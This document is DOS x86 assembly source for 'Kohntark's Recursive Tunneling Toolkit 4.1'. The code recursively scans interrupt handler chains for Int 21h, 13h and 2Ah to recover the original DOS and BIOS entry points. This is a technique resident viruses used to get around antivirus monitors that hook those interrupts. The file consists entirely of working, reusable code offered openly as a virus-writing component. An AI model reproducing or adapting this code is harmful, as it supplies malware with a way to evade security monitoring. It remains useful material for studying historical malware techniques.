

; KOHNTARK'S RECURSIVE TUNNELING TOOLKIT 4.1 (KRTT 4.1)
; KEEP THIS IN MIND WHEN LOOKING AT THE CODE:
; 	JMP ????:????		==>		EA????????
;	CALL ????:????		==>		9A????????
;	JMP FAR [????]		==>		FF2E????
;	CALL FAR [????]		==>		FF1E????
; AND ALSO:
;	JMP ????		==>		FF26????
;	CALL ????		==>		E8????

code		segment word public
	assume cs:code, ds:code, es:code, ss:code
public Tunnel
Tunnel		label		byte
	CLI
	XOR	AX,AX			; Get Segment Zero ==> ES
	MOV	ES,AX
	XOR	DI,DI
	MOV	DX,ES:[0AEH]		; Get Int 2B Segment Addr
	MOV	CX,ES:[0A2H]		; Get Int 28 Segment Addr
	CMP	DX,CX			; Are They Equal?
	JZ	Proceed			; If So, Go On
	MOV	CX,ES:[0B2H]		; Get Int 2C Segment Addr
	CMP	DX,CX			; Equal or Not?
	JZ	Proceed			; Of So Go On
	MOV	AH,3			; Internal DOS interrupts are
	RET					; Hooked (Int 2b, 28, 2c)

Proceed:
	CMP	BP,1			; Check Int 2A?
	JZ	CheckInt2A
	CMP	BP,2			; Check Int 13?
	JZ	CheckInt13

	MOV	BX,ES:[84H]		; Check Int 21
	MOV	ES,ES:[86H]      	; Get Int 21 Far Addres
	JMP	CheckInt21

CheckInt13:
	MOV	BX,ES:[4CH]		; Get Int 13 Far Address
	MOV	ES,ES:[4EH]
	MOV	BP,ES
	MOV	DX,70H			; Is Segment = 0070?
	CMP	BP,DX
	JZ	NotHooked		; If it is: Int not hooked
	JMP	Hooked			; If Not, Continue

CheckInt2A:
	MOV	BX,ES:[0A8H]		; Get Int 2A Far Address
	MOV	ES,ES:[0AAH]

CheckInt21:
	MOV	BP,ES			; Compare Segment of Int 21/2A
	CMP	DX,BP			; with segment of Int 28
	JNZ	Hooked

NotHooked:
	XCHG	BX,DI			; BX = 0
	MOV	AH,2			; They're equal: 
	RET				; Int Not hooked!

Hooked:
	CALL	DoTunneling
	STI
	RET

DoTunneling:
; NOTE THAT:
;	ADDRESSES OF CODE TO TUNNEL (INT 21, 13, 2A) ARE PASSED IN ES:BX
;	DX HOLDS SEGMENT ADDRESS OF INTERNAL INT 2A OR BIOS SEGMENT 70H
;	AH HOLDS RESULTS, AL RECURSION DEPTH
	PUSH	ES
	PUSH	BX
	CMP	AL,7			; if recursion depth 7
	JZ	ExitTun			; exit
	CMP	AH,1			; if found
	JZ	ExitTun			; exit

	INC	AL			; increase recursion depth
	MOV	CX,0FFFAH		; 
	SUB	CX,BX			; 

continue:
	PUSH	BX

	CMP	BYTE PTR ES:[BX],0E8H	; call xxxx?
	JZ	icall
	CMP	BYTE PTR ES:[BX],0EAH	; jmp xxxx:xxxx?
	JZ	immfound
	CMP	BYTE PTR ES:[BX],9AH	; call xxxx:xxxx?
	JZ	immfound
	CMP	BYTE PTR ES:[BX],2EH	; cs:?
	JNZ	nothingf

indirect_jmp_or_call:
	CMP	BYTE PTR ES:[BX+1],0FFH
	JNZ	nothingf
	CMP	BYTE PTR ES:[BX+2],1EH	; call far [xxxx]
	JZ	indfound
	CMP	BYTE PTR ES:[BX+2],2EH	; jmp far [xxxx]
	JNZ	nothingf

indfound:				; indirect (call far [x], jmp far [x])
	MOV	BP,ES:[BX+3]		; get addr of variable
	DEC	BP
	XCHG	BX,BP
	JMP	immfound		; and go get its contents

nothingf:
	POP	BX
	CMP	AH,1
	JZ	ExitTun
	CMP	AL,7
	JZ	ExitTun
	INC	BX
	LOOP	continue

icall:
	POP	BX			; its a call near
	ADD	BX,3			; continue
	LOOP	continue

ExitTun:
	POP	BX
	POP	ES
	RET

immfound:
	POP	BP			; get addr of instruccion
	ADD	BP,4			; save addres for next instruccion
	PUSH	BP			; see if segment of jmp is equal to
	CMP	ES:[BX+3],DX		; desired segment.
	JZ	found			; if it is, exit
	CMP	WORD PTR ES:[BX+3],0	; see if its zero.
	JZ	nothingf
	PUSH	ES
	POP	BP
	CMP	ES:[BX+3],BP		; see if it is within current seg.
	JZ	nothingf
; if none of the precedent, then its a non-int21, far call or jmp
	MOV	BP,BX
	MOV	BX,ES:[BX+1]		; get offset
	MOV	ES,ES:[BP+3]		; get segment
	CALL	DoTunneling 		; and call recursively

	JMP	nothingf

found:
	MOV	DI,ES:[BX+01]		; get the offset of int
	MOV	AH,1			; return with succes
	JMP	nothingf
ends
end
